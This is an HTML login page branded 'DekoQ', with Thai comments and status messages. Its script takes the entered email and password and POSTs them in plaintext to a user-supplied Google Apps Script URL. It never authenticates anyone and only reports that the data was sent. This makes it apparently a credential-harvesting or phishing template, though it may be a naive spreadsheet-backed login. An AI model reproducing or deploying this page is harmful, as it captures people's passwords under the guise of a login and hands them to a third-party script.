<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>DekoQ Login</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: #007bff;
      font-family: 'Arial', sans-serif;
      height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      color: white;
    }

    .brand-title {
      font-size: 3rem;
      font-weight: bold;
      margin: 0;
    }

    .subtitle {
      font-size: 1.2rem;
      margin-top: 0.5rem;
      margin-bottom: 2rem;
    }

    .form-box {
      background: white;
      padding: 2rem;
      border-radius: 12px;
      box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
      width: 90%;
      max-width: 400px;
      color: black;
    }

    .form-box label {
      display: block;
      margin-bottom: 0.5rem;
      font-weight: bold;
    }

    .form-box input {
      width: 100%;
      padding: 0.75rem;
      margin-bottom: 1.2rem;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 1rem;
    }

    .form-box button {
      width: 100%;
      padding: 0.75rem;
      background: #222;
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 1rem;
      cursor: pointer;
      transition: background 0.3s ease;
    }

    .form-box button:hover {
      background: #000;
    }

    #status {
      margin-top: 1rem;
      font-size: 0.9rem;
      color: green;
      text-align: center;
    }
  </style>
</head>
<body>
  <h1 class="brand-title">DekoQ</h1>
  <p class="subtitle">Welcome!</p>

  <div class="form-box">
    <form>
      <label for="email">Username/Email</label>
      <input type="email" id="email" name="email" placeholder="Value" required />

      <label for="password">Password</label>
      <input type="password" id="password" name="password" placeholder="Value" required />

      <button type="submit">Submit</button>
    </form>
    <p id="status"></p>
  </div>

  <script>
    const form = document.querySelector("form");
    const scriptURL = "https://script.google.com/macros/s/วาง-URL-ของคุณที่นี่/exec"; // <<== ใส่ลิงก์ Apps Script ของคุณ
    const status = document.getElementById("status");

    form.addEventListener("submit", (e) => {
      e.preventDefault();
      const email = form.email.value;
      const password = form.password.value;

      fetch(scriptURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, password }),
      })
        .then((res) => res.text())
        .then((res) => {
          status.textContent = "ส่งข้อมูลสำเร็จแล้ว!";
          form.reset();
        })
        .catch((err) => {
          status.textContent = "เกิดข้อผิดพลาด!";
          console.error(err);
        });
    });
  </script>
</body>
</html>
